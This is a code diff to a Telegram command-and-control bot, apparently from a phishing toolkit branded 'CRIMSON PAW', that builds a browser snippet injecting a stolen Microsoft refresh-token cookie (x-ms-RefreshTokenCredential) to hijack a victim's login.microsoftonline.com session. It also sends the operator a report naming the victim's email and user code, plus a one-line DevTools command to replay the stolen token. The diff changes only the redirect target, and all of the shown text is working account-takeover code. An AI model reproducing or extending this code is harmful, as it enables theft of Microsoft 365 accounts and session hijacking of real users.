@@ -358,8 +358,8 @@ class TelegramC2BotThread(threading.Thread):
                     "  } else {\n"
                     "    document.cookie = 'x-ms-RefreshTokenCredential=' + cookieVal + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none';\n"
                     "  }\n"
-                    "  console.log('%c[CRIMSON PAW] ✓ Session Injected! Reloading...', 'color:#22c55e;font-weight:bold;');\n"
-                    "  location.reload();\n"
+                    "  console.log('%c[CRIMSON PAW] ✓ Session Injected! Redirecting to Office 365...', 'color:#22c55e;font-weight:bold;');\n"
+                    "  window.location.href = 'https://www.office.com/?auth=2';\n"
                     "})();\n"
                 )
 
@@ -369,9 +369,9 @@ class TelegramC2BotThread(threading.Thread):
                     f"• <b>Victim:</b> <code>{victim_email}</code>\n"
                     f"• <b>User Code:</b> <code>{uc}</code>\n"
                     f"• <b>Cookie Name:</b> <code>x-ms-RefreshTokenCredential</code>\n"
-                    f"• <b>Status:</b> 🟢 Valid (Ready for SSO Bypass)\n\n"
+                    f"• <b>Status:</b> 🟢 Valid (Ready for SSO)\n\n"
                     f"<b>1-Line DevTools Snippet (F12 on login.microsoftonline.com):</b>\n"
-                    f"<pre>await cookieStore.set({{name:'x-ms-RefreshTokenCredential',value:'{prt_cookie}',domain:'login.microsoftonline.com',path:'/',sameSite:'none',secure:true}});location.reload();</pre>\n\n"
+                    f"<pre>await cookieStore.set({{name:'x-ms-RefreshTokenCredential',value:'{prt_cookie}',domain:'login.microsoftonline.com',path:'/',sameSite:'none',secure:true}});window.location.href='https://www.office.com/?auth=2';</pre>\n\n"
                     f"<i>Complete executable script attached below as a .txt file.</i>"
                 )
                 self._send_text(bot_token, chat_id, msg)
